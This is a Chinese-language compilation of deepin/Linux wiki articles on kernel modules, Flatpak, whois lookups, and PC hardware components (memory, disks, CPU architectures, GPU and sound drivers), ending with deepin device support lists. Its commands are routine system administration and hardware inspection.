Linux 内核采用单内核体系设计，但充分借鉴了微内核设计体系的优点，为内核引入模块化机制。其重要组成部分包括：kernel（内核核心，一般为bzImage，通常在/boot目录下，名称为vmlinuz-VERSION-RELEASE）、kernel object（内核对象，一般放置于/lib/modules/VERSION-RELEASE/，[ ]表示不编译进内核，[M]表示编译为模块文件，[*]表示编译进内核）、辅助文件(ramdisk)如initrd和initramfs。

uname命令的使用格式为uname [OPTION]...，参数包括：-n显示节点名称、-r显示VERSION-RELEASE、-s内核名称、-v内核版本、-m硬件名称、-i硬件平台、-p处理器类型、-o操作系统。例如，uname -m输出i686，uname -r输出2.6.32-573.22.1.el6.i686。

lsmod命令用于显示内核已装载的模块，内容来自/proc/modules文件。常用lsmod | grep -i 模块名查询特定模块。其输出字段含义：第1列是模块名称，第2列是模块大小，第3列是依赖模块个数，第4列是依赖模块内容。例如，lsmod | grep ext4可查询ext4模块信息。

modinfo命令用于显示模块的详细描述信息，可查询未安装模块，默认格式为fieldname : value。选项包括：-n只显示模块文件路径、-p显示模块参数、-a显示作者、-d显示描述、-l显示许可证。例如，modinfo ext4可查看ext4模块信息，输出包含filename、license等。

modprobe命令用于装载或卸载内核模块，配置文件为/etc/modprobe.conf和/etc/modprobe.d/*.conf，需依赖modules.dep文件（由depmod生成）。选项包括：-r删除模块、-v显示操作信息、-n调试模式、-i忽略install和remove。例如，modprobe -r 模块名可卸载模块。

/proc目录是proc伪文件系统，内核通过它输出内部状态信息、统计信息及可配置参数。sysctl命令用于查看或设置/proc/sys下的参数，默认配置文件为/etc/sysctl.conf。修改参数方式：sysctl -w parameter=VALUE或echo VALUE > /proc/sys/path/to/parameter。例如，sysctl -w kernel.hostname=xxx可修改主机名。

/sys目录是sysfs伪文件系统，输出内核识别的硬件属性及设定信息，部分参数可修改。udev是用户空间设备管理器，通过/sys信息动态创建设备文件，规则文件位于/etc/udev/rules.d及/usr/lib/udev/rules.d。ramdisk文件可通过mkinitrd或dracut命令制作，例如mkinitrd /boot/initramfs-$(uname -r).img $(uname -r)。

编译内核的前提包括：准备开发环境（如Server Platform Development、Development Tools包组）、获取硬件信息（通过lscpu、lspci等）、获取内核源码（www.kernel.org）。配置选项命令有make config、make menuconfig等；编译用make [-j #]；安装用make modules_install和make install。

标题：Flatpak详细介绍
Flatpak是一种构建、发布、安装和运行应用程序的技术。它主要的目标是Linux桌面系统，同时也可以适用于嵌入式等系统中。Flatpak的设计目标是：使应用程序可以安装在任何一个发行版上；为应用程序提供固定的环境，实施测试和减少缺陷；实现应用程序和操作系统的解耦和，使应用程序可以不依赖于特定的发行版本；使应用程序可以自带依赖，能够使用linux发行版没有提供的依赖，避免其对特定发行版本甚至特定库的依赖；在沙箱中独立运行应用程序，提升安全性。Flatpak使这些特性易于实现。如果你对flatpak还不了解，建议尝试一下hello workd的例子。更多信息可查看 flatpak.org。

我们可以通过几个关键概念来了解flatpak，这同时也可以解释flatpak和传统包管理器的差异。Runtimes：运行时提供应用程序所须的基本依赖。有多种不同的运行时，从小（但是非常稳定）的freedesktop运行时，到大的桌面环境运行时例如KDE、Gnome等。每一个应用程序都必须基于一个运行时进行构建，运行时需要安装在宿主系统中老保证应用的运行。用户可以同时安装多种不同的运行时，包括同一运行时的不同版本。Tips:每个运行时都可以被认为是一个/usr文件系统。事实上，当一个程序运行的时候，他的运行时会挂载到/usr。Bundled libraries：如果一个应用程序需要依赖一些运行时没有提供的库，这些库就需要随应用程序绑定发布。这使应用程序可以使用系统中没有提供的依赖，或者使用与安装在宿主系统中的版本不同的依赖。

SDKs（Software Developer Kits）：SDK是一个包含了“devel”模块的运行时，他们不会在应用运行的时候被用到。这些工具包含打包工具、头文件、编译器以及调试器。每一个应用程序都基于其运行时对应的SDK构建。Extensions：extension是一个运行时或者应用的可选项。通常是分离自运行时的翻译、调试信息等。例如org.freedesktop.Platform.Locale可以添加到org.freedesktop.Platform运行时实现翻译。Sandboxs：通过Flatpak，每一个应用都构建和运行在独立的环境中。默认情况下，应用程序只能看到它自己和它的运行时。访问用户文件、网络、图形套接字、bus子系统和设备都需要显示的授权。而其他的访问，例如访问其他进程等是不可能的。

flatpak命令用于安装、删除、更新应用程序和运行时。同时也可用于浏览当前已经安装应用，并提供命令来构建和发布应用绑定。可通过flatpak –help获得帮助。大部分的flatpak命令都是系统级的。如果要执行一个仅限于当前用户的命令，可以使用–user选项，这会使运行时和应用程序与当前用户绑定（仅运行在当前用户下）。关于flatpak的更多信息可见Command Reference。

Flatpak使用一个唯一的名称标记每一个应用、运行时和SDK。有时候这回作为name/arch/branch的一部分。Flatpak的命名方式采用的是与DNS地址相关的方式，例如com.company.App。地址的最后一部分是对象的名字，前面的部分则是其所属的域。为了防止命名冲突，域应当与DNS注册地址一致。这表示域可以来自某个网站、某个应用或者某个组织。例如，如果一个应用的网站是app.com，则它的flatpak名称应当是com.app.App。多个应用可以属于同一个域，例如org.organization.App1 和org.organization.App2。如果你没有为你的应用注册域，可以使用第三方网站表示，例如Github上就允许创建私人包，在这里，可以使用个人的名空间name.github.io，相应的应用则可命名为io.github.name.App。如果一个应用提供了D-Bus服务，一般要求D-Bus服务的名字和应用的名字一致。

很多Flatpak命令仅仅需要应用的名字、运行时或SDK。但是某些环境中也需要去指定架构和分支（通过分支可以指定特定的版本）。这可以通过name/arch/branch三元组实现。例如org.gnome.Sdk/x86_64/3.14 或者 org.gnome.Builder/i386/master。Flatpak使用了许多现有的技术。使用Flatpak并不需要对其非常了解，当然有些时候了解这些技术也是很有用的。这些技术包含：来自Atomic项目的bubblewrap应用，它通过下列内核特性，可以让普通用户设置和运行容器：Cgroups、Namespaces、Bind mounts、Seccomp规则、systemd为沙箱设置cgroups；D-Bus，一种为应用程序提供高级API的成熟方法；Open Container Initiative的OCI格式，作为单文件包的便捷传输格式；用于版本控制和分发文件系统的OSTree系统；Appstream元数据，允许Flatpak应用程序在软件中心应用程序中很好地显示。

标题：Whois信息收集及利用方式
'Whois'是一个用于查询域名或IP地址注册信息的服务，它允许用户了解域名的详细信息，如注册者、注册机构等。使用'Whois'的步骤如下：1.安装'Whois'工具：在命令行中输入'rpm -qa | grep whois'检查是否已安装，未安装可通过'wget'、'yum'或'rpm包'安装，或直接执行'sudo apt install whois'。2.查询域名信息：在命令行中输入'whois 域名'查询，例如查询'baidu.com'可输入'whois baidu.com'；也可通过网页接口，在浏览器中输入'whois+域名'查询。

标题：内存入门
内存（英语：Computer memory）是一种利用半导体技术做成的电子设备，用来存储数据。电子电路的数据是以二进制的方式存储，存储器的每一个存储单元称做记忆元。

内存可以根据存储能力与电源的关系可以分为以下两类：1.易失性存储器 易失性存储器（Volatile memory）指的是当电源供应中断后，存储器所存储的数据便会消失的存储器。主要有以下的类型：- RAM（Random access memory，随机访问存储器）- DRAM（Dynamic random access memory，动态随机访问存储器）- SRAM（Static random access memory，静态随机访问存储器）2.非易失性存储器 非易失性存储器（Non-volatile memory）是指即使电源供应中断，存储器所存储的数据并不会消失，重新供电后，就能够读取内存数据的存储器。主要有以下的类型：- ROM（Read-only memory，只读存储器）- PROM（Programmable read-only memory，可编程只读存储器）- EPROM（Erasable programmable read only memory，可擦可编程只读存储器）- EEPROM （Electrically erasable programmable read only memory，可电擦可编程只读存储器）- Flash memory（闪存）

桌面可通过“启动器” -> “系统监视器”查看内存信息 终端执行：```shell cat /proc/meminfo  ##通过/proc文件查看内存信息 dmesg | grep mem  ##通过查看开机信息获取内存信息 free -m  ##查看当前内存使用信息 vmstat   ##查看虚拟内存统计信息 grep MemTotal /proc/meminfo   ##查看内存总量 grep MemFree /proc/meminfo    ##查看空闲内存量 dmidecode | grep -i mem  ##通过dmidecode获取内存信息```

标题：内存控制器
# 内存控制器
## 简介
内存控制器是一个用于管理与规划从内存到CPU间传输速度的总线电路控制器，它可以是一个单独的芯片，或集成到有关的大型芯片里：如CPU或北桥内置的内存控制器。
## 工作方式
内存控制器控制着必要的逻辑读取和写入DRAM ，并每隔一段时间刷新动态随机存取存储器(DRAM)里的内容。如果没有不断刷新DRAM将会丢失已写入的数据，因为DRAM的储存单元其实是电容器的一种，电容器会不断泄漏它储存的电荷。进行读取和写入动作时，内存控制器会根据数据地址到DRAM中选择行和列，通过一个多路转换器将数据合并以减少操作所需的总线宽度，由DRAM输入端的多路转换器电路承接转换操作，其中经由DRAM的多路分解器为转换后的输入数据选择正确的存储器位置并返回数据。

标题：硬盘
硬盘（英语：Hard Disk Drive，简称HDD）是电脑上使用坚硬的旋转盘片为基础的非易失性存储设备，它在平整的磁性表面存储和检索数字数据，信息通过离磁性表面很近的写头，由电磁流来改变极性方式被电磁流写到磁盘上，信息可以通过相反的方式回读，例如磁场导致线圈中电气的改变或读头经过它的上方。早期的硬盘存储媒介是可替换的，不过今日典型的硬盘是固定的存储媒介，碟片与磁头被封装在机身里（除了一个过滤孔，用来平衡工作时产生的热量导致的气压差）。

主引导记录（Master Boot Record，缩写：MBR），又叫做主引导扇区，是计算机开机后访问硬盘时所必须要读取的首个扇区，它在硬盘上的三维地址为（柱面，磁头，扇区）＝（0，0，1）。

全局标识唯一分区表（GUID Partition Table）是一个实体硬盘的分区结构，它是可扩展固件接口（EFI）标准的一部分，用来取代现有大多数磁盘的主启动记录MBR分区表。尽管它是EFI的一部分，它依然可以和部分BIOS通力合作，因为它还能解决MBR无法正常管理超过2TB的单个硬盘的问题，在一个超过2TB大小的硬盘上，主启动记录只能管理2TB。GPT解决这个问题的方式是通过分配64位的逻辑块地址，使其支持的最大硬盘和分区尺寸为2⁶⁴-1个扇区。在一个扇区512字节大小的磁盘上，这意味着GPT支持9.4ZB的单个硬盘和分区。截止至2010年，大多数操作系统对GPT均有所支持，尽管包括Mac OS X和Windows在内的一些仅支持在EFI基础上自GPT分区启动。

Disks:是Gnome桌面环境的一款简单的磁盘管理软件。GParted:是一款硬盘管理软件GNU Parted的GTK+图形界面前端。

终端执行以下命令可查看硬盘相关信息：mount | column -t  ## 查看挂接的分区状态；sudo fdisk -l  ##查看硬盘分区情况；swapon -s   # # 查看所有交换分区；hdparm -i /dev/hda     ##查看磁盘参数(仅适用于IDE设备)；df -h     ##查看硬盘大小信息；du -h     ##查看硬盘使用情况；sudo hdparm -I /dev/sda  ##查看硬盘详细信息；dmesg | grep sda ##通过查看开机信息获取硬盘信息；sudo iotop  ##查看硬盘I/O读取状态；inxi -D  ##查看硬盘硬件情况。

安装hddtemp软件查看硬盘温度,终端执行：sudo apt-get install hddtemp  ##安装hddtemp软件；sudo hddtemp /dev/sda   ##查看硬盘温度。

目前硬盘的磁盘分区架构分类有如下两种: 主引导记录(MBR): 主引导记录（Master Boot Record，缩写：MBR），又叫做主引导扇区，是计算机开机后访问硬盘时所必须要读取的首个扇区，它在硬盘上的三维地址为（柱面，磁头，扇区）＝（0，0，1）。 全局唯一标识分区表（GPT）: 全局标识唯一分区表（GUID Partition Table）是一个实体硬盘的分区结构，它是可扩展固件接口（EFI）标准的一部分，用来取代现有大多数磁盘的主启动记录MBR分区表。 尽管它是EFI的一部分，它依然可以和部分BIOS通力合作，因为它还能解决MBR无法正常管理超过2TB的单个硬盘的问题，在一个超过2TB大小的硬盘上，主启动记录只能管理2TB。GPT解决这个问题的方式是通过分配64位的逻辑块地址，使其支持的最大硬盘和分区尺寸为2⁶⁴-1个扇区。在一个扇区512字节大小的磁盘上，这意味着GPT支持9.4ZB的单个硬盘和分区。 截止至2010年，大多数操作系统对GPT均有所支持，尽管包括Mac OS X和Windows在内的一些仅支持在EFI基础上自GPT分区启动。

查看信息可通过以下方式：软件查询：Disks是Gnome桌面环境的一款简单的磁盘管理软件。GParted是一款硬盘管理软件GNU Parted的GTK+图形界面前端。命令查看：终端执行：mount | column -t（查看挂接的分区状态）、sudo fdisk -l（查看硬盘分区情况）、swapon -s（查看所有交换分区）、hdparm -i /dev/hda（查看磁盘参数，仅适用于IDE设备）、df -h（查看硬盘大小信息）、du -h（查看硬盘使用情况）、sudo hdparm -I /dev/sda（查看硬盘详细信息）、dmesg | grep sda（通过开机信息获取硬盘信息）、sudo iotop（查看硬盘I/O读取状态）、inxi -D（查看硬盘硬件情况）。温度信息：安装hddtemp软件后，执行sudo hddtemp /dev/sda可查看硬盘温度。

标题：CPU
CPU是整个计算机的运算大脑，是计算机最重要的部分之一。

CPU架构可以理解为CPU的规范，不同的架构使用不同的指令集。指令集分为两种，一种是CISC复杂指令集，一种是RISC精简指令集，两种指令集各有优势。目前CPU的主流架构有PC端的x86，MIPS，移动端的ARM，RISC-V以及我国自研LoongArch架构。x86处理器是个人计算机以及服务器上最常见的架构，同时也是大多数Linux发行版支持的架构，deepin提供x86_64（AMD64）镜像下载。ARM处理器主要用于移动端，网络设施以及低功耗设备。目前市场主流的智能手机和路由器普遍采用ARM处理器，知名开源硬件树莓派同样使用了ARM处理器。目前，许多Linux发行版和软件提供ARM版本下载。LoongArch处理器是我国自主研发的CPU架构，目前已经得到很多主流开源社区的支持，Linux kernel 5.19已经初步支持龙芯架构。RISC-V处理器近年来迅速发展，许多RISC-V处理器出现在市场。

中断其实就是由硬件或软件所发送的一种称为IRQ（中断请求）的信号。中断允许让设备，如键盘，串口卡，并口等设备表明它们需要CPU。一旦CPU接收了中断请求，CPU就会暂时停止执行正在运行的程序，并且调用一个称为中断处理器或中断服务程序（interrupt service routine）的特定程序。

CPU参数一般是由处理器厂商对用户提供的有关于处理器的详细信息，如核心数、主频、电压等。

标题：指令集及架构
在之前CPU页面简单讲过关于处理器的指令集以及架构，接下来我们详细了解一下几种常见的处理器架构。

x86是目前个人计算机的主流处理器架构，泛指一系列基于Intel 8086且向后兼容的中央处理器指令集架构。最早的8086处理器于1978年由Intel推出，为16位微处理器。x86 架构于1978年推出的Intel 8086中央处理器中首度出现，它是从Intel 8008处理器中发展而来的，而8008则是发展自Intel 4004的。8086在三年后为IBM PC所选用，之后x86便成为了个人电脑的标准平台，成为了历来最成功的CPU架构。8086是16位处理器；直到1985年32位的80386的开发，这个架构都维持是16位。接着一系列的处理器表示了32位架构的细微改进，推出了数种的扩展，直到2003年AMD对于这个架构发展了64位的扩展，并命名为AMD64。后来英特尔也推出了与之兼容的处理器，并命名为Intel 64。两者一般被统称为x86-64或x64，开创了x86的64位时代。

在2022年的今天，x86处理器主要用于个人计算机，服务器以及超级计算机，其拥有超强的运算能力以及稳定性。然而，与各种精简指令集架构相比，x86处理器存在着能耗高，发热量大等问题。

ARM架构是一个精简指令集（RISC）处理器架构，其广泛地使用在许多嵌入式系统设计。由于节能的特点，其在其他领域上也有很多作为。ARM处理器非常适用于移动通信领域，符合其主要设计目标为低成本、高性能、低耗电的特性。另一方面，超级计算机消耗大量电能，ARM同样被视作更高效的选择。

ARM架构版本从ARMv3到ARMv7支持32位空间和32位算数运算，大部分架构的指令为定长32位（Thumb）指令集支持变长的指令集，提供对32位和16位指令集的支持），而2011年发布的ARMv8-A架构添加了对64位空间和64位算术运算的支持，同时也更新了32位定长指令集。

ARMv9架构发布，ARM正式开始弃用32位架构，但是仍保留了32位程序兼容性。ARM64已经与aarch64已经合并，他们为同一架构（一般Apple公司称之为ARM64，GNU/Linux称之为aarch64）

MIPS（Microprocessor without Interlocked Pipeline Stages），是一种采取精简指令集（RISC）的指令集架构（ISA），由美国MIPS计算机系统公司开发，现为美普思科技。MIPS广泛被使用在许多电子产品、网络设备、个人娱乐设备与商业设备上。最早的MIPS架构是32位，最新的版本已经变成64位。2021年3月，MIPS宣布MIPS架构的开发已经结束，因为该公司正在向RISC-V过渡。

RISC-V（发音为“risk-five”）是一个基于精简指令集（RISC）原则的开源指令集架构（ISA），简易解释为开源软件运动相对应的一种“开源硬件”。该项目2010年始于加州大学柏克莱分校，但许多贡献者是该大学以外的志愿者和行业工作者。与大多数指令集相比，RISC-V指令集可以自由地用于任何目的，允许任何人设计、制造和销售RISC-V芯片和软件而不必支付给任何公司专利费。虽然这不是第一个开源指令集，但它具有重要意义，因为其设计使其适用于现代计算设备（如仓库规模云计算机、高端移动电话和微小嵌入式系统）。设计者考虑到了这些用途中的性能与功率效率。该指令集还具有众多支持的软件，这解决了新指令集通常的弱点。

目前，Deepin适配了多个RISC-V开发板，VisionFive2，SG2042以及LicheePi 4A

LoongArch，简称LA，是一个龙芯中科研发的指令集架构。该架构包含了架构翻译（Architecture Translate）的指令子集，可在软硬配合下高效率翻译诸如x86-64、ARM架构、MIPS架构、RISC-V架构等指令集架构。龙芯目前支持运行 Debian、Deepin、Gentoo、UOS 等多种 Linux 发行版。

Alpha是64位的RISC微处理器，支持VMS操作系统、Linux和BSD。最初由DEC公司制造，并被用于DEC自己的工作站和服务器中。作为VAX的后续被开发，支援VMS操作系统，如Digital UNIX。不久之后开放源代码的操作系统也可以在其上运行，如Linux。微软起初也支持这款处理器，但是从Windows 2000 beta3开始放弃了对Alpha的支持。

目前，我国自主研发的神威·太湖之光超级计算机中使用的40960个神威26010处理器就是申威基于Alpha指令集研发的。申威原本属于Alpha阵营，指令集是基于Alpha进行扩展的。申威的技术来源是于DEC的Alpha 21164。目前Alpha已经被束之高阁，指令集和微结构都已经不再更新，技术专利过期。申威是目前Alpha阵营中仅存的硕果，拥有自主扩展指令和发展路线的自主权。

标题：北桥芯片与FSB
北桥芯片(NorthBridge)是主板芯片组中起主导作用的最重要的组成部分，就是主板上离CPU最近的一块芯片，负责与CPU的联系并控制内存，作用是在处理器与PCI总线、DRAM、AGP和L2高速缓存之间建立通信接口。

北桥芯片负责与CPU的联系并控制内存AGP数据在北桥内部传输，提供对CPU的类型和主频、系统的前端总线频率、内存的类型和最大容量、AGP插槽、ECC纠错等支持，整合型芯片组的北桥芯片还集成了显示核心。北桥起到的作用非常明显，在电脑中起着主导的作用，所以人们习惯的称为主桥(Host Bridge)。

北桥芯片就是主板上离CPU最近的芯片，这主要是考虑到北桥芯片与处理器之间的通信最密切，为了提高通信性能而缩短传输距离。因为北桥芯片的数据处理量非常大，发热量也越来越大，所以现在的北桥芯片都覆盖着散热片用来加强北桥芯片的散热，有些主板的北桥芯片还会配合风扇进行散热。

FSB是指CPU与北桥芯片之间的数据传输总线，又称前端总线

标题：PCIE设备
PCIE 是一种高速串行计算机扩展总线标准

通道由两个差分信号对组成，一对用于接收数据，另一对用于发送。每个通道由四条线或信号迹线组成。在概念上，每条通道用作全双工字节流，在链路端点之间的两个方向同时传输8位‘字节’格式的数据包。物理PCIE链路可能包含1个到32个通道，更精确地包括1,2,4,8,12,16或32个通道。通道计数用‘×’前缀，×16是常用的最大尺寸。

标题：主板
主板（英语：Motherboard, Mainboard，简称Mobo）；又称主机板、系统板、逻辑板、母板、底板等，是构成复杂电子系统例如电子计算机的中心或者主电路板。

中央处理器（CPU）插槽（用来固定中央处理器）、存储器插槽、南桥、北桥

目前主板固件一般有以下两种:1. 基本输入输出系统(BIOS) BIOS（Basic Input/Output System的缩写、中文：基本输出输入系统），是加载在电脑硬件系统上的最基本的软件代码。2. 统一可扩展固件接口(EFI) 统一可扩展固件接口（英语：Unified Extensible Firmware Interface，简称UEFI）是一种个人电脑系统规格，用来定义操作系统与系统软件之间的软件界面，为替代BIOS的升级方案。可扩展固件接口负责加电自检（POST）、连系操作系统以及提供连接操作系统与硬件的接口。统一可扩展固件接口(UEFI)最初是由英特尔开发，它原名为可扩展固件接口（英语：Extensible Firmware Interface，简称EFI）。现时由统一可扩展固件接口论坛（UEFI论坛）来推广与发展。

终端执行：dmidecode | grep -i 'serial number' ##查看主板信息 cat /proc/pci ##通过/proc文件查看主板信息

标题：主板内的蜂鸣器
蜂鸣器是主板上基本的硬件提示设备，从嵌入式到大型机，都会具备。都有直接的控制接口。在终端中，可以使用命令 xset -b off 或 xset -b on 来关闭或打开蜂鸣器。更多设置可以查看 man xset 帮助或参考 IBM 的 xset命令文档。

标题：北桥芯片
北桥引擎是主板芯片组两枚芯片中的一枚，北桥设计用来处理高速信号，如CPU、内存、显卡、高速PCIE设备，还有与南桥之间通信的功能

北桥芯片位于和CPU插槽附近。由于北桥芯片处理的任务较多，发热量较大，上面一般都覆盖了散热片或散热风扇

标题：南桥芯片
南桥芯片是电脑主板芯片组中的另一枚芯片。南桥设计用来处理低速IO信号，如PCI总线、USB、网卡、ATA、SATA、声卡、键盘、电源管理等。南桥芯片一般位于PCI接口下方。

标题：电源
电源供应器（英语：Power supply unit，简称PSU或电源），是电脑之中的一个组件，负责将交流电转成稳定的直流电12V与5V，给电脑内其它的组件所使用的电源。常见分类: AT, ATX。

标题：显卡
显卡（Video card、Display card、Graphics card、Video adapter），是个人电脑最基本组成部分之一，用途是将计算机系统所需要的显示信息进行转换驱动显示器，并向显示器提供逐行或隔行扫描信号，控制显示器的正确显示，是连接显示器和个人电脑主板的重要组件，是“人机对话”的重要设备之一。Deepin目前支持AMD，NVIDIA，Intel等主流显卡，同时支持摩尔线程MTT S80国产显卡

硬件型号命令查询，终端执行：lspci |grep -i 'VGA'    #查看默认集成显卡型号；lspci |grep -i nvidia  #查看NVIDIA类型的显卡型号；sudo dmesg | grep -i 'VGA'  #通过查看开机信息获取显卡信息

AMD（原ATI）显卡需要安装闭源显卡驱动，然后终端执行：sudo aticonfig --odgt；NVIDIA显卡需要安装闭源显卡驱动，然后终端执行：sudo nvidia-settings -q GPUCoreTemp -t；摩尔线程显卡需要安装摩尔线程提供的驱动，然后终端执行：mthreads-gmi

Linux系统安装完成后，就会默认启用内核自带的开源驱动，开源驱动虽然性能不如闭源驱动，但是兼容性和稳定性较为优秀。如果系统没有问题，不建议安装闭源驱动

ATI显卡安装闭源驱动：由于ATI显卡的闭源驱动更新较慢，建议安装源内的版本，不建议安装ATI官方提供的版本。命令自动安装：安装源内版本，终端执行：sudo apt-get install fglrx-driver  #安装驱动包。卸载：命令卸载，终端执行（如果开机无法进入X，就进入TTY执行命令）：sudo apt-get purge fglrx* glx-alternative-fglrx libgl1-fglrx* #删除驱动包

NVIDIA显卡安装闭源驱动（命令自动安装）：在BIOS里禁用其中之一，如果禁用NVIDIA显卡的话也许会提升电池续航能力，但并不适用于所有BIOS，也不能切换显卡。安装源内版本，终端执行：sudo apt-get install nvidia-driver #安装驱动包；如果以上命令不能正常安装驱动，终端执行：sudo apt install nvidia-detect > /dev/null 2>&1  && nvidia-detect  #检测合适的驱动包，然后使用命令安装对应的驱动包，例如检测结果为nvidia-legacy-340xx-driver，命令为sudo apt-get install  nvidia-legacy-340xx-driver #安装驱动包

NVIDIA显卡安装闭源驱动（手动安装）：注意：安装英伟达官方.run驱动很有可能出现问题，建议使用源内版本，请斟酌。步骤：1.浏览器访问NVIDIA官网，下载与硬件相符合的闭源驱动安装文件，放到家目录下（例：“NVIDIA-Linux-x86_64-352.55.run”），不要改名字；2.按“Ctrl+Alt+F2”进入tty2，登录系统；3.停止lightdm服务：sudo systemctl stop lightdm #关闭登录管理器服务；4.若有旧驱动先卸载：sudo apt-get remove --purge nvidia*；5.若之前用nouveau则禁用：echo 'blacklist nouveau'|sudo tee -a /etc/modprobe.d/nvidia-blacklists-nouveau.conf，sudo update-initramfs -u；6.安装驱动：chmod u+x NVIDIA-Linux-x86_64-352.55.run #赋予可执行权限，sudo ./NVIDIA-Linux-x86_64-352.55.run #安装驱动文件；安装中可能假死，需耐心等待；安装完成后重启，若无图形界面尝试：sudo systemctl start lightdm

NVIDIA显卡闭源驱动卸载：如果为命令自动安装，终端执行：sudo apt-get remove nvidia-driver nvidia-kernel-dkms glx-alternative-nvidia；如果为手动安装，终端执行：sudo nvidia-uninstall 或 sudo nvidia-installer --uninstall

Intel & ATI双显卡关闭独显方法：方法一：开机时按屏幕提示进主板设置，将独显设置为不启用。方法二：在linux3.06下，1.加载模块：sudo mount -t debugfs debugfs /sys/kernel/debug；2.查看显卡状态：sudo cat /sys/kernel/debug/vgaswitcheroo/switch（正常输出含“0:DIS: : Pwr:0000:01:00.0”“1:IGD:+:Pwr:0000:00:02.0”，Off表电源关闭，Pwr表运转）；3.禁用独显执行：echo OFF > sudo /sys/kernel/debug/vgaswitcheroo/switch；4.开机自动关闭：编辑/etc/rc.local（sudo gedit /etc/rc.local），在exit 0前加“sudo mount -t debugfs debugfs /sys/kernel/debug”“echo OFF > /sys/kernel/debug/vgaswitcheroo/switch”

Intel & NVIDIA双显卡配置：1.安装nvidia驱动：sudo apt install nvidia-driver；nvidia-legacy-304xx-driver 和 nvidia-legacy-340xx-driver 是对旧显卡支持的驱动。2.编辑/etc/X11/xorg.conf（通过lspci | egrep 'VGA|3D'获取设备BusID，例00:02.0填写PCI:0:2:0）：Section "Module" Load "modesetting" EndSection；Section "Device" Identifier "nvidia" Driver "nvidia" BusID "PCI:X:X:X" Option "AllowEmptyInitialConfiguration" EndSection。3.编辑/etc/lightdm/display_setup.sh：#!/bin/sh；xrandr --setprovideroutputsource modesetting NVIDIA-0；xrandr --auto；xrandr --dpi 96；然后执行sudo chmod +x  /etc/lightdm/display_setup.sh

安装闭源驱动后可能出现：开机动画消失、分辨率异常、电脑温度大幅度上升，这些多为闭源驱动的副作用，建议卸载闭源驱动。解决驱动兼容性故障：1.能进入图形界面：用“附加驱动”更换列表中的其他驱动，重启生效；2.只能进入恢复模式：执行sudo apt-get autoremove --purge nvidia-*（移除驱动及配置文件），然后执行sudo reboot（重启）

显卡相关链接：Debian Wiki: GraphicsCard（https://wiki.debian.org/GraphicsCard）、Bumblebee项目主页（http://www.bumblebee-project.org/）、Bumblebee常见问题（https://github.com/Bumblebee-Project/Bumblebee/wiki/FAQ）

常见问题

如果安装闭源驱动后，出现类似开机动画消失、分辨率异常、电脑温度大幅度上升，大都为闭源驱动的副作用，建议卸载闭源驱动。

自行下载官网的闭源驱动，更新闭源新版驱动，会随机出现的严重vlinuz启动内核编译失败，导致系统无法引导至图形界面，而且即使编译成功，也并不能保证与闭源驱动版本号准确对应，同样会造成系统无法引导至图形界面。使用“附加驱动”内提供的闭源驱动相对安全一些，风险也较低。

标题：声卡
声卡 (Sound Card)也叫音频卡：声卡是多媒体技术中最基本的组成部分，是实现声波/数字信号相互转换的一种硬件。声卡的基本功能是把来自话筒、磁带、光盘的原始声音信号加以转换，输出到耳机、扬声器、扩音机、录音机等声响设备，或通过音乐设备数字接口(MIDI)使乐器发出美妙的声音。

目前Linux下声卡系统主要有以下两种：1.高级Linux声音体系(ALSA) 高级Linux声音体系（英语：Advanced Linux Sound Architecture，缩写为ALSA）是Linux内核中，为声卡提供的驱动组件，以替代原先的OSS（开放声音系统）。一部分的目的是支持声卡的自动配置，以及完美的处理系统中的多个声音设备，这些目的大多都已达到。另一个声音框架JACK使用ALSA提供低延迟的专业级音频编辑和混音能力。2.开放声音系统(OSS) 开放声音系统（Open Sound System，OSS）是一个在 Unix 操作系统上用于发出和取得声音的接口。它是基于标准的 Unix 设备（即 POSIX 的读、写、ioctl 等）。

命令查询，终端执行：lspci | grep Audio   ##列出当前声卡信息

如果声卡出现问题，可以重装声卡相关模块和软件包解决问题。首先终端执行：sudo apt-get --purge remove alsa-base alsa-utils ##卸载声卡相关模块和软件包和对应配置文件。然后终端执行：sudo apt-get install alsa-base alsa-utils  ##安装声卡相关模块和软件包。

设置声卡的方式也多，本条目使用alsamixer进行设置。终端执行：alsamixer。语法：alsamixer [options]。选项：-h，-help显示帮助信息。-c <card number or idenfication>指定需要设置的声卡，默认为0。-D <device identification>选择需要控制的调节器。-g设置界面颜色。-s最小化界面窗口。进入alsamixer界面后，可以使用下面快捷键进行控制：左右箭头或n，p用来选择通道。上下箭头或+，-同时调整选定通道的左右声道的音量。B，=设置左右声道音量相同。M静音当前通道。<，>分别对左，右声道静音。空格选择录音源，在选定的通道上按空格，可以标记此通道为录音源，此操作仅限输入设备。插入键或;，删除键或'分别选定左右通道。-L刷新屏幕。PageUp增大5格音量。PageDown减小5格音量。End设置音量为0。分别调整左，右或整个通道的音量。Q，W，E增大左，右，通道的音量。Z，X，C减小左，右，通道的音量。alt-q，ESC退出。没有声音，只有呲啦呲啦的噪音，查看PCM值是不是已经都到底，变成了0了，适当调高即可。无论音量大与小，都会时不时出现爆音，查看PCM值过是否高，过高就会出现爆音，调低PCM值即可。当音量调节较大时候，发现有很多的噪音，调节一下Front，把Mic适当降低一点，或者直接改成零即可。

标题：deepin多架构适配机型清单
RISC-V 设备适配

以下是所有支持或曾有计划支持的 RISC-V 设备列表。

deepin 的 RISC-V 设备适配基线是：

核心支持 rv64gc
支持基本显示输出和键盘鼠标输入

关于镜像

除非明确说明，镜像的默认用户为：

root: deepin
无普通用户

除非明确说明，镜像将在第一次启动时进入安装器配置界面以引导创建用户

支持设备列表

见 https://deepin-community.github.io/sig-deepin-ports/matrix

计划支持但尚未有设备

- MilkV Meles
- MilkV Jupiter
- Pine64 Star64
- LicheeBook 4A
- LicheeConsole 4A
- LicheePadMax 4A
- LicheePocket 4A

不计划支持的设备

- MilkV Duo (性能弱)
- MilkV Duo S (性能弱)
- LicheePad 4A (不适合桌面)

Loongarch 设备适配

参考 deepin 版本发布日志。

标题：deepin适配机型清单
昂达适配的机型为：台式机ONDA H110P PRO@Intel(R) Celeron(TM) G3900。

戴尔适配的机型包括：笔记本Dell Latitude E7240@Intel Core i5-4210U、Dell Inspiron N5110@Intel Core i5-2450M、Dell System Inspiron N4110@Intel Core i3-2330M，台式机Dell Precision Tower 3620@Intel(R) Core(TM) i3-6100、Dell Vostro 3902@Intel(R) Pentium(R) CPU G3220。

东芝适配的机型包括：笔记本Toshiba Satellite L510@Intel Core i3-330M、Toshiba Satellite C40-A@Intel Core i3-3110M、TOSHIBA PSC6GQ-00W005@Intel Core i3-2328M。

富士通适配的机型为：笔记本FUJITSU FJNB26C@Intel Core i5-3230M。

红米适配的机型为：笔记本Timi TM1607@Intel Core m3-7Y30。

